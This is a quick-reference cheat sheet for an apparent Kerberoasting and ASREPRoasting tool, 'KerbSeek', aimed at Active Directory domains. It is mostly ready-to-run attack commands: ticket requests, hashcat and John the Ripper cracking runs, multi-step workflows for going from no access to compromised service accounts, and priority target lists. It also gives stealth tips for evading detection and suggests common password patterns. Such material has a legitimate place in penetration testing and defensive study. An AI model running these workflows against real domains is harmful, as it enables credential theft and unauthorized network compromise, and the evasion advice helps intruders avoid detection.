# KerbSeek Quick Reference

## Quick Start

```bash
# Basic Kerberoasting (requires domain credentials)
./kerbseek.py --domain CORP.LOCAL -u user -p pass --kerberoast

# ASREPRoasting (no credentials needed)
./kerbseek.py --domain CORP.LOCAL --asreproast userlist.txt

# Auto-discovery and attack
./kerbseek.py --auto dclist.txt

# Target specific users with SPNs
./kerbseek.py --domain CORP.LOCAL -u user -p pass --spns spn_users.txt
```

## Common Commands

### Kerberoasting
```bash
# Request TGS tickets for all SPNs
./kerbseek.py -d CORP.LOCAL -u serviceacct -p pass --kerberoast

# Target specific SPNs from file
./kerbseek.py -d CORP.LOCAL -u user -p pass --spns accounts.txt

# Request tickets for specific account
./kerbseek.py -d CORP.LOCAL -u user -p pass --target-user svc-sql
```

### ASREPRoasting
```bash
# Test list of users (no pre-auth required)
./kerbseek.py -d CORP.LOCAL --asrep users.txt

# Single user ASREPRoast test
./kerbseek.py -d CORP.LOCAL --asrep-user jdoe

# Combined with port scan
./kerbseek.py --auto dc.txt --asrep userlist.txt
```

### Auto Mode
```bash
# Scan DCs and perform all attacks
./kerbseek.py --auto targets.txt -u user -p pass

# Auto with specific user list
./kerbseek.py --auto dcs.txt --asrep users.txt
```

## Output Files

| File | Description | Format |
|------|-------------|--------|
| `kerblist.txt` | Vulnerable accounts | Text list |
| `tgs_hashes.txt` | Kerberoast hashes | Hashcat 13100 |
| `asrep_hashes.txt` | ASREPRoast hashes | Hashcat 18200 |
| `tickets.txt` | Raw ticket data | Base64 |
| `kerb_details.txt` | Full report | Human-readable |
| `kerb_details.json` | JSON export | Machine-parseable |

## Hash Cracking

### Hashcat Examples
```bash
# Crack Kerberoast hashes (TGS-REP)
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# Crack ASREPRoast hashes (AS-REP)
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# With rules
hashcat -m 13100 tgs_hashes.txt wordlist.txt -r rules/best64.rule

# Brute force (short passwords)
hashcat -m 18200 asrep_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d
```

### John the Ripper
```bash
# Kerberoast
john --wordlist=wordlist.txt tgs_hashes.txt

# ASREPRoast
john --wordlist=wordlist.txt asrep_hashes.txt

# Show cracked passwords
john --show tgs_hashes.txt
```

## Attack Workflows

### Workflow 1: No Initial Access
```bash
# 1. Get user list from public sources (LinkedIn, website, etc.)
# 2. Try ASREPRoasting (no creds needed)
./kerbseek.py -d CORP.LOCAL --asrep discovered_users.txt

# 3. Crack captured AS-REP hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# 4. Use cracked creds for Kerberoasting
./kerbseek.py -d CORP.LOCAL -u cracked_user -p cracked_pass --kerberoast
```

### Workflow 2: With Domain Credentials
```bash
# 1. Enumerate SPNs and request TGS tickets
./kerbseek.py -d CORP.LOCAL -u domain_user -p password --kerberoast

# 2. Crack service account passwords
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule

# 3. Target high-value service accounts
grep -i "admin\|sql\|backup" tgs_hashes.txt > priority.txt
hashcat -m 13100 priority.txt wordlist.txt
```

### Workflow 3: Combined Attack
```bash
# 1. Auto-discover Kerberos services
./kerbseek.py --scan subnet.txt

# 2. ASREPRoast first (low-hanging fruit)
./kerbseek.py -d CORP.LOCAL --asrep users.txt

# 3. Use any cracked account for Kerberoasting
./kerbseek.py -d CORP.LOCAL -u compromised -p pass --kerberoast

# 4. Crack all collected hashes
cat tgs_hashes.txt asrep_hashes.txt > all_hashes.txt
hashcat -m 13100 tgs_hashes.txt rockyou.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

## Encryption Types

| Type | ID | Crackability | Notes |
|------|-----|--------------|-------|
| RC4-HMAC | 23 | ⚡ Fast | Fastest to crack, common in older environments |
| AES128 | 17 | 🐢 Slow | Harder to crack, more secure |
| AES256 | 18 | 🐌 Very Slow | Hardest to crack, strongest |
| DES | 1,3 | ⚡ Fast | Deprecated, rare |

**Priority**: Target RC4-HMAC tickets first for faster cracking success.

## Common Options

```
-d, --domain DOMAIN          Target domain (e.g., CORP.LOCAL)
-u, --username USER          Domain username
-p, --password PASS          Domain password
-dc, --dc-ip IP              Domain Controller IP
--kerberoast                 Request TGS tickets for SPNs
--asreproast FILE            ASREPRoast users from file
--spns FILE                  Kerberoast specific SPNs
--asrep-user USER            ASREPRoast single user
--target-user USER           Target specific user for Kerberoasting
--auto FILE                  Auto-discover and attack
--scan FILE                  Scan for Kerberos services only
-w, --workers N              Concurrent threads (default: 10)
-t, --timeout N              Connection timeout (default: 3)
-v, --verbose                Detailed output
```

## Target Selection

### High-Value SPNs
```bash
# Look for these in kerblist.txt:
MSSQLSvc/*          # SQL Server service accounts
HTTP/*              # Web service accounts
TERMSRV/*           # RDP service accounts
RestrictedKrbHost/* # Computer accounts
host/*              # Generic host services
```

### ASREPRoast Priorities
```bash
# Test these user patterns first:
- Service accounts (svc-*, service-*)
- Application accounts (app-*, sql-*)
- Legacy accounts (may have older settings)
- Disabled accounts (sometimes overlooked)
```

## Troubleshooting

### No Tickets Captured
```bash
# Check connectivity to DC
./kerbseek.py --scan dc.txt

# Verify credentials
net use \\DC01\IPC$ /user:DOMAIN\username password

# Check for SPNs in domain
setspn -Q */*
```

### Hash Format Issues
```bash
# Verify hash format
head -n 1 tgs_hashes.txt
# Should be: $krb5tgs$23$*user$realm$SPN*$hash

# Check for truncation
wc -l tgs_hashes.txt asrep_hashes.txt
```

### Clock Skew Errors
```bash
# Sync time with DC (Kerberos requires <5 min difference)
net time \\DC01 /set /yes    # Windows
ntpdate dc01.corp.local       # Linux
```

## Integration Examples

### With Impacket
```bash
# Get TGS tickets with GetUserSPNs.py
GetUserSPNs.py DOMAIN/user:pass -dc-ip 10.0.0.1 -request

# Get AS-REP hashes with GetNPUsers.py
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.0.0.1
```

### With Rubeus (Windows)
```powershell
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# ASREPRoasting
Rubeus.exe asreproast /outfile:asrep.txt
```

### With BloodHound
```bash
# 1. Collect AD data
bloodhound-python -d CORP.LOCAL -u user -p pass -dc DC01 -c All

# 2. Query for SPNs in BloodHound GUI:
MATCH (u:User) WHERE u.hasspn=true RETURN u

# 3. Export list and feed to KerbSeek
./kerbseek.py -d CORP.LOCAL -u user -p pass --spns bloodhound_spns.txt
```

## Tips & Tricks

### 🎯 Maximize Success Rate
- **Start with ASREPRoast**: No credentials needed
- **Target RC4 first**: Much faster to crack
- **Use leaked password lists**: Corporates often reuse breached passwords
- **Try seasonal passwords**: Winter2024!, Summer2024!, etc.
- **Check default patterns**: Company123!, Password1!, Welcome1!

### 🔍 Stealth Considerations
- **Limit requests**: Use `-w 5` for slower, stealthier scans
- **Avoid floods**: Don't request hundreds of tickets at once
- **Rotate accounts**: Use different domain users for requests
- **Check for honeypots**: Be wary of accounts with tempting SPNs

### ⚡ Performance Tips
- **Use SSD for cracking**: Massive speed boost
- **Prioritize high-value**: Target admin/sql/backup accounts first
- **Parallel cracking**: Split hash files across multiple GPUs
- **Rule-based attacks**: Use best64.rule before brute force

## Quick Checks

```bash
# Check if output files were created
ls -lh kerblist.txt tgs_hashes.txt asrep_hashes.txt

# Count vulnerable accounts found
wc -l kerblist.txt

# Preview Kerberoast hashes
head -n 3 tgs_hashes.txt

# Check encryption types in tickets
grep -o "etype [0-9]*" tickets.txt | sort | uniq -c

# Find RC4-HMAC tickets (easier to crack)
grep "etype 23" kerb_details.txt
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success - found vulnerable accounts |
| 1 | No vulnerabilities found |
| 2 | Authentication failed |
| 3 | No Kerberos services found |

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────┐
│                  KERBSEEK CHEAT SHEET                   │
├─────────────────────────────────────────────────────────┤
│ ATTACKS                                                 │
│  --kerberoast        Request TGS (needs domain creds)   │
│  --asreproast FILE   Request AS-REP (no creds needed)   │
│  --auto FILE         Discover + attack everything       │
├─────────────────────────────────────────────────────────┤
│ CRACKING                                                │
│  hashcat -m 13100    Kerberoast (TGS-REP)              │
│  hashcat -m 18200    ASREPRoast (AS-REP)               │
├─────────────────────────────────────────────────────────┤
│ OUTPUTS                                                 │
│  tgs_hashes.txt      Kerberoast hashes                 │
│  asrep_hashes.txt    ASREPRoast hashes                 │
│  kerblist.txt        Vulnerable accounts               │
├─────────────────────────────────────────────────────────┤
│ PRIORITY TARGETS                                        │
│  MSSQLSvc/*          SQL Server accounts               │
│  HTTP/*              Web service accounts              │
│  RC4-HMAC (23)       Fastest to crack                  │
└─────────────────────────────────────────────────────────┘
```

## Learning Resources

- **Kerberos Protocol**: RFC 4120
- **Kerberoasting**: https://attack.mitre.org/techniques/T1558/003/
- **ASREPRoasting**: https://attack.mitre.org/techniques/T1558/004/
- **Hashcat Wiki**: https://hashcat.net/wiki/
- **Impacket Tools**: https://github.com/SecureAuthCorp/impacket
